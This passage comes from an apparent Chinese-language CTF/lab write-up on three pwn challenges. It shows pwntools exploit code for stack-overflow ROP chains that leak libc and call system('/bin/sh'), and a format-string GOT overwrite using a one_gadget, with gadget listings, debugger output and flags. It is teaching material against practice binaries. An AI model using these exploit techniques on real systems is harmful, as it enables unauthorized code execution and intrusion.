+</pre><p>得到 libc 的地址为 <code>0x0000773842C00000</code></p><h3 id=getting-system-shell>Getting system shell</h3><p>已经知道了 libc 的地址，那就从 libc 里面找 gadget：<code>ROPgadget --binary ./libc.so.6 --only "pop|ret"</code></p><p>需要找一个 rdi_ret 与一个单独的 ret ，但是单独的 ret 空转的原因，上网说是因为<strong>ubuntu18及以上</strong>在<strong>调用system函数的时候会先进行一个检测</strong>，如果此时的<strong>栈没有16字节对齐的话</strong>，就会<strong>强行把程序crash掉</strong>，所以需要<strong>栈对齐</strong> ，但我并没有看懂。无论如何，在 libc 里面找到了这样两个 gadgets：</p><pre>0x000000000002a3e5 : pop rdi ; ret
+0x0000000000029139 : ret</pre><p>然后像下面这样构造 payload ，就可以直接获取 shell 了：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Getting system shell</span>
+</span></span><span class=line><span class=cl><span class=n>ret_addr</span> <span class=o>=</span> <span class=mh>0x0000000000029139</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>rdi_rtn_addr</span> <span class=o>=</span> <span class=mh>0x000000000002a3e5</span> <span class=o>+</span> <span class=n>libc_addr</span>
+</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#system函数的地址</span>
+</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#‘/bin/sh’的地址</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>payload</span> <span class=o>=</span> <span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>Canary</span><span class=p>)</span> <span class=o>+</span> <span class=sa>b</span><span class=s1>&#39;AABBCCDD&#39;</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_rtn_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span> 
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;system_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;bin_sh_addr:</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x110</span><span class=p>)</span>
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recv</span><span class=p>(</span><span class=mh>0x110</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行效果如下：</p><p><img src=https://s2.loli.net/2024/07/29/RmdVi6tZyqKMfT2.png loading=lazy alt=image-20240727002154799.png></p><p>成功获得 flag 为 <code>AAA{oh_R0P_1s_b4b@b4b@s1c~}</code></p><h3 id=approach-2-orw>Approach 2 ORW</h3><p>ORW 即 <code>open(file, olfag)</code> <code>read(fd, buf, n_bytes)</code> 与 <code>write(fd, buf, n_bytes)</code> 。</p><p>所以要用 rdi 对应文件地址 <code>file</code> 用于 open， 对应 <code>fd</code> 项用于 read 与 write：在ORW中，我们需要设置 read 的 <code>fd</code> 为 3，表示从文件中读取，write的 <code>fd</code> 还是如常，依旧为 1 ；</p><p>用 rsi 对应 <code>oflag</code> 用于 open （由于只用读取就行了所以取 0 ），对应 <code>buf</code> 用于 read 与 write；</p><p>最后用 rdx 对应 <code>n_bytes</code> 用于 read 与 write 。</p><p>我们先前已经找到了 <code>pop_rdi_ret</code> 的 gadget了，接着找 rsi 与 rdx 的 ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>0x000000000011f2e7 : pop rdx ; pop r12 ; ret
+</span></span><span class=line><span class=cl>0x000000000002be51 : pop rsi ; ret
+</span></span></code></pre></td></tr></table></div></div><p>所以对于调用 <code>open(rdi -> "./flags.txt", rsi -> 0)</code> ，我们可以将栈写成这个样子：</p><div class=table-wrapper><table><thead><tr><th><code>pop_rdi_ret_addr</code></th><th><code>"./flags.txt"</code></th><th><code>pop_rsi_ret</code></th><th>0x00000000</th><th><code>open_addr</code></th></tr></thead></table></div><p>对于调用 <code>read(rdi -> 3, rsi -> oflag)</code> ，</p><h2 id=task2-onerop>Task2 onerop</h2><p>本题目的完整代码为 attachment 中的 <code>pwnlab2_task2_code.py</code></p><h3 id=preparation--leaking-libc-addr>Preparation & Leaking libc addr</h3><p><code>checksec</code> 一下，没有开 PIE 与 Canary，感觉比第一题友好多了，用 IDA 编译出来的 <code>main()</code> 也是十分简单：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>int</span> <span class=kr>__fastcall</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>argc</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>argv</span><span class=p>,</span> <span class=k>const</span> <span class=kt>char</span> <span class=o>**</span><span class=n>envp</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=p>{</span>
+</span></span><span class=line><span class=cl>  <span class=kr>__int64</span> <span class=n>buf</span><span class=p>[</span><span class=mi>32</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-100h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>buf</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=k>sizeof</span><span class=p>(</span><span class=n>buf</span><span class=p>));</span>
+</span></span><span class=line><span class=cl>  <span class=nf>read</span><span class=p>(</span><span class=mi>0</span><span class=p>,</span> <span class=n>buf</span><span class=p>,</span> <span class=mh>0x1000uLL</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>((</span><span class=k>const</span> <span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>buf</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span><span class=line><span class=cl><span class=p>}</span>
+</span></span></code></pre></td></tr></table></div></div><p><code>0x100</code> 长的内存却给了 <code>0x1000</code> 的读入，妥妥的栈溢出。</p><p>用 ROPgadget 一看，甚至题目本身就有一些好用的 gadget：</p><pre>0x00000000004011c5 : pop rdi ; ret
+0x000000000040101a : ret
+0x0000000000401181 : retf</pre><p>再者，用 <code>seccomp-tools dump</code> 查看，发现程序没有开启沙箱，可以考虑 get shell 了。现在要做的就是泄漏 libc 基址，然后使用 libc 的 <code>system(/bin/sh)</code> 获取 shell 控制权。</p><p>同时，使用 gdb 动态调试，在 Backtrace 栏中发现</p><pre><font color=#12488B>─────────────────────────────────[ BACKTRACE ]──────────────────────────────────</font>
+ ► 0         0x40131a main+336
+   1   0x7ffff7c2a1ca __libc_start_call_main+122
+   2   0x7ffff7c2a28b __libc_start_main+139
+   3         0x4010b5 _start+37
+</pre><p>所以一开始的思路，就是利用栈溢出让 <code>puts()</code> 函数输出 <code>main()</code> 的返回地址（关于 <code>__libc_start_call_main</code> 的偏移地址是 +122），而 <code>__libc_start_call_main</code> 相对于 <code>__libc_start_main</code> 的偏移地址是 -0xB0 ，可以因此求出 <code>__libc_start_main</code> 的实际地址，然后求得 libc 的地址。但是由于没有循环，且正常流程只能进行一次输入，所以首次输入（尚不知道 libc 地址）就要构造 ROP 链使得 <code>main()</code> 返回到它自身，然后在第二次输入（此时已经知道 libc 地址）构造 ROP 链以获取 shell 控制权。</p><p>看起来很好，但是失败了——最后程序没有像设想的打开 shell，而是报段错误退出。为什么呢？ Debug 后发现，我们在第一次输入时为了让 <code>main()</code> 返回到它自身，肯定要把原来 <code>main()</code> 的返回地址覆盖掉，所以我们用 <code>puts()</code> 函数输出的，其实是 <code>main()</code> 的地址，而不是<code>__libc_start_call_main + 122</code> ，这个思路错了。</p><p>既然不能泄漏 <code>main()</code> 原来的返回地址，那就泄漏 <code>main()</code> 调用过的函数。看了一堆作题笔记后，发现 <code>puts()</code> 比较好弄：</p><p>我们第一次输入前，先求 <code>puts()</code> 的 plt 与 got 地址（因为 glibc 的延迟绑定机制），然后通过第一次输入把栈覆写成这个形式：</p><div class=table-wrapper><table><thead><tr><th><code>pop_rdi_ret_addr</code></th><th><code>puts_got</code></th><th><code>puts_plt</code></th><th><code>main_addr</code></th></tr></thead></table></div><p>这样，我们在第一次输出后，<code>main()</code> 函数 return （执行第一个 <code>ret</code> 时 <code>rbp</code> 指向 <code>pop_rdi_ret_addr</code> ）到 <code>pop rdi; ret;</code> 的 gadget， 就可以将 <code>puts()</code> 的实际地址（在 GOT 表内，所以是 <code>puts_got</code> ）作为参数传给 rdi ，然后再次 return （执行第二个 <code>ret</code> 时 <code>rbp</code> 指向 <code>puts_plt</code> ）到 <code>puts()</code> 函数从而输出它自己的实际地址，然后再 return 到 <code>main()</code> 函数。我们就可以用 <code>puts()</code> 函数的地址求 libc 的地址了。</p><p>代码如下：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Step one Leaking puts() address &amp; return to main() again</span>
+</span></span><span class=line><span class=cl><span class=n>main_addr</span> <span class=o>=</span> <span class=mh>0x00000000004011CA</span>
+</span></span><span class=line><span class=cl><span class=n>ret_addr</span> <span class=o>=</span> <span class=mh>0x000000000040101a</span>
+</span></span><span class=line><span class=cl><span class=n>rdi_ret_addr</span> <span class=o>=</span> <span class=mh>0x00000000004011c5</span>   
+</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>puts_offsets</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>offset</span> <span class=o>=</span> <span class=mh>0x100</span> <span class=o>+</span> <span class=mh>0x8</span>
+</span></span><span class=line><span class=cl><span class=n>payload1</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_got</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>puts_plt</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>main_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># conn.interactive();</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#first puts()</span>
+</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>conn</span><span class=o>.</span><span class=n>recvline</span><span class=p>()</span> <span class=c1>#second puts() outputs its addr</span>
+</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>received1</span><span class=o>.</span><span class=n>strip</span><span class=p>(</span><span class=sa>b</span><span class=s1>&#39;</span><span class=se>\n</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>received1</span> <span class=o>=</span> <span class=n>received1</span><span class=o>.</span><span class=n>ljust</span><span class=p>(</span><span class=mi>8</span><span class=p>,</span> <span class=sa>b</span><span class=s1>&#39;</span><span class=se>\0</span><span class=s1>&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>puts_addr</span> <span class=o>=</span> <span class=n>u64</span><span class=p>(</span><span class=n>received1</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>libc_addr</span> <span class=o>=</span> <span class=n>puts_addr</span> <span class=o>-</span> <span class=n>puts_offsets</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;puts_addr =&gt; &#34;</span><span class=o>+</span> <span class=nb>hex</span><span class=p>(</span><span class=n>puts_addr</span><span class=p>))</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;libc_addr =&gt; 0x</span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>libc_addr</span><span class=p>))</span> 
+</span></span></code></pre></td></tr></table></div></div><p>效果如下：</p><p><img src=https://s2.loli.net/2024/07/29/N7zCeuRF8pivmtY.png loading=lazy alt=image-20240727205306318.png></p><p>可以看到获取的 libc 地址为 <code>0x00007F6506C9D000</code></p><h3 id=getting-system-shell-1>Getting system shell</h3><p>最后，按如下构造 payload ，可以获取 shell：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span><span class=lnt>9
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=c1># Step two Getting system shell</span>
+</span></span><span class=line><span class=cl><span class=n>system_addr</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;system&#39;</span><span class=p>]</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#system函数的地址</span>
+</span></span><span class=line><span class=cl><span class=n>bin_sh_addr</span> <span class=o>=</span> <span class=nb>next</span><span class=p>(</span><span class=n>libc</span><span class=o>.</span><span class=n>search</span><span class=p>(</span><span class=s1>&#39;/bin/sh&#39;</span><span class=p>))</span> <span class=o>+</span> <span class=n>libc_addr</span> <span class=c1>#‘/bin/sh’的地址</span>
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;bin_sh_addr =&gt; </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>log</span><span class=o>.</span><span class=n>info</span><span class=p>(</span><span class=s2>&#34;system_addr =&gt; </span><span class=si>{:016X}</span><span class=s2>&#34;</span><span class=o>.</span><span class=n>format</span><span class=p>(</span><span class=n>system_addr</span><span class=p>))</span> 
+</span></span><span class=line><span class=cl><span class=n>payload2</span> <span class=o>=</span> <span class=sa>b</span><span class=s1>&#39;A&#39;</span><span class=o>*</span><span class=n>offset</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>rdi_ret_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>bin_sh_addr</span><span class=p>)</span> <span class=o>+</span> <span class=n>p64</span><span class=p>(</span><span class=n>system_addr</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>send</span><span class=p>(</span><span class=n>payload2</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>conn</span><span class=o>.</span><span class=n>interactive</span><span class=p>()</span>
+</span></span></code></pre></td></tr></table></div></div><p>运行后效果如下：</p><p><img src=https://s2.loli.net/2024/07/29/5fQkt6G91YDpjPn.png loading=lazy alt=image-20240727205158947.png></p><p>得到 flag 为 <code>AAA{r0p_oN3_5Im3_ROP_f0r3ve3}</code></p><h2 id=task3-onefsb>Task3 onefsb</h2><p>本题目的完整代码为 attachment 中的 <code>pwnlab2_task3_code.py</code></p><h3 id=preparation-1>Preparation</h3><p>checksec 一下，是关闭了 PIE 保护，同时打开的 Partial RELRO 的 64 位程序，注意到开了 Canary，栈溢出要小心点。</p><p>IDA 反编译一下，<code>main()</code> 基本逻辑是这样的：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>s</span><span class=p>[</span><span class=mi>8</span><span class=p>];</span> <span class=c1>// [rsp+0h] [rbp-110h] BYREF
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=kt>unsigned</span> <span class=kr>__int64</span> <span class=n>v36</span><span class=p>;</span> <span class=c1>// [rsp+108h] [rbp-8h]
+</span></span></span><span class=line><span class=cl><span class=c1></span>
+</span></span><span class=line><span class=cl>  <span class=n>v36</span> <span class=o>=</span> <span class=nf>__readfsqword</span><span class=p>(</span><span class=mh>0x28u</span><span class=p>);</span> <span class=c1>// 设置 Canary
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>initbuf</span><span class=p>(</span><span class=n>argc</span><span class=p>,</span> <span class=n>argv</span><span class=p>,</span> <span class=n>envp</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;what&#39;s your message: &#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>memset</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>0</span><span class=p>,</span> <span class=mh>0x100</span><span class=p>)</span> <span class=c1>// 将 [rbp-110h] 开始到 [rbp-11h] 共 256 个字节的内存清零 
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>fgets</span><span class=p>(</span><span class=n>s</span><span class=p>,</span> <span class=mi>255</span><span class=p>,</span> <span class=n>stdin</span><span class=p>);</span> <span class=c1>// 从 s 开始输入 255 256 个字节
+</span></span></span><span class=line><span class=cl><span class=c1></span>  <span class=nf>printf</span><span class=p>(</span><span class=n>s</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=nf>puts</span><span class=p>(</span><span class=s>&#34;bye&#34;</span><span class=p>);</span>
+</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
+</span></span></code></pre></td></tr></table></div></div><p>做这题的时候，我首先想到利用 FSB Bug ，使用类似于前两道 Task 的思路，先泄漏 <code>main()</code> 的返回地址从而获得 libc 地址，如果不方便获得 <code>main()</code> 的返回地址，就想办法泄漏其他函数的地址，然后利用 ROP 将程序 return 到 <code>system('/bin/sh')</code> 上，但是实际操作时遇到了只有一次利用 FSB 的机会，若劫持控制流就不能泄漏 <code>main()</code> 的返回地址 ，然后是 <code>printf()</code> 使用 <code>%u</code> 写入时导致段错误，以及直接写 ROP 链太麻烦等各种困难</p><p>然后就是（请求场外援助 sad 后得到的 hint） Partial RELRO ，它允许我们能够覆写 GOT 表，可不可以获取 <code>system</code> 的 GOT 表地址将其覆盖到 <code>main()</code> 要调用的一个函数在 GOT 表上的地址从而达到调用 <code>system("/bin/sh")</code> 的机会？结果也不行，一次利用 FSB 的限制不能让我做到这一点。那能不能用覆写 GOT 表从而做到无限利用 FSB ? 等等，<code>main()</code> 结束前怎么有一个 <code>puts("bye")</code> ，豁然开朗了：把 <code>puts_got</code> 变成 <code>main()</code> ，这样就让做完恶作剧的小鬼程序被狠狠脑控定身任我为非作歹 😡😡😡 ；至于 ROP 链，换成一个 one_gadget ，在这里找到的是这个：</p><pre><font color=#D7D7FF>0xebc85</font> execve(&quot;/bin/sh&quot;, <font color=#5FFF00>r10</font>, <font color=#5FFF00>rdx</font>)
+<font color=#FF5F5F>constraints</font>:
+  address <font color=#5FFF00>rbp</font>-<font color=#D7D7FF>0x78</font> is writable
+  [<font color=#5FFF00>r10</font>] == NULL || <font color=#5FFF00>r10</font> == NULL || <font color=#5FFF00>r10</font> is a valid argv
+  [<font color=#5FFF00>rdx</font>] == NULL || <font color=#5FFF00>rdx</font> == NULL || <font color=#5FFF00>rdx</font> is a valid envp
+</pre><p>在第一次 payload，要做的就是：劫持控制流，将 <code>puts_got</code> 覆写成 <code>main()</code> ，让程序想 &ldquo;bye&rdquo; 却被我狠狠脑控当场拿下</p><p>第二次，输出 <code>printf()</code> 地址从而获取 libc 地址，从而获得 one_gadget 的地址</p><p>第三次，就是将 <code>puts_got</code> 覆写成 one_gadget ，对我言听计从 😤😤😤</p><h3 id=getting-offsets>Getting offsets</h3><p>首先打开程序，确定格式化字符串的相对偏移。打开程序，输入 <code>AAAAAAAA.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p.%p</code> ，结果如下：</p><p><img src=https://s2.loli.net/2024/07/29/kmynu7LHE4gA6zG.png loading=lazy alt=image-20240728164321356.png></p><p>可以看到， <code>AAAAAAAA</code> ，即 <code>0x4141414141414141</code> 位于格式化字符串后的第六个偏移。</p><p>使用 gdb 调试， 输入 <code>AAAAAAAA</code> 后断点在 <code>printf()</code> 内，然后看栈内容，结果如下：</p><pre><font color=#C01C28><b>pwndbg&gt; </b></font>x /40gx $rsp
+<font color=#12488B>0x7fffffffdac8</font>:	0x000000000040139e	0x4141414141414141
+<font color=#12488B>0x7fffffffdad8</font>:	0x000000000000000a	0x0000000000000000
+<font color=#12488B>0x7fffffffdae8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdaf8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb08</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb18</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb28</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb38</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb48</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb58</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb68</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb78</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb88</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdb98</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdba8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdbb8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdbc8</font>:	0x0000000000000000	0x0000000000000000
+<font color=#12488B>0x7fffffffdbd8</font>:	0xf53edbb42f9f1d00	0x0000000000000001
+<font color=#12488B>0x7fffffffdbe8</font>:	0x00007ffff7c29d90	0x0000000000000000
+<font color=#12488B>0x7fffffffdbf8</font>:	0x00000000004011fd	0x0000000100000000
+<font color=#C01C28><b>pwndbg&gt; </b></font>p $rbp
+<font color=#2AA1B3>$3</font> = (void *) <font color=#12488B>0x7fffffffdbe0</font>
+<font color=#C01C28><b>pwndbg&gt; </b></font>p $rsp
+<font color=#2AA1B3>$4</font> = (void *) <font color=#12488B>0x7fffffffdac8</font>
+</pre><p>可以看到，输入的格式字符串 <code>AAAAAAAA</code> 位于栈的第二位，由于此时位于 <code>printf()</code> 函数内， <strong>栈的最顶部 rbp 指向的是 <code>printf()</code> 的返回地址，所以不算做参数</strong>，同时由于是 64 位程序，前六个参数在寄存器内，所以格式字符串就是 <code>printf()</code> 的第七个参数，也就是格式化字符串（ rdi ）后的第六个偏移。</p><h3 id=hijacking-control-flow>Hijacking control flow</h3><p>首先就是拿下 <code>puts()</code> ，像这样构建 payload ：</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-python data-lang=python><span class=line><span class=cl><span class=n>context</span><span class=p>(</span><span class=n>arch</span> <span class=o>=</span> <span class=s1>&#39;amd64&#39;</span><span class=p>,</span> <span class=n>os</span><span class=o>=</span><span class=s1>&#39;linux&#39;</span><span class=p>,</span> <span class=n>log_level</span><span class=o>=</span><span class=s1>&#39;DEBUG&#39;</span><span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>puts_plt</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>plt</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>puts_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;puts&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>printf_got</span> <span class=o>=</span> <span class=n>elf</span><span class=o>.</span><span class=n>got</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=n>printf_offset</span> <span class=o>=</span> <span class=n>libc</span><span class=o>.</span><span class=n>symbols</span><span class=p>[</span><span class=s1>&#39;printf&#39;</span><span class=p>]</span>
+</span></span><span class=line><span class=cl><span class=c1># pause()</span>
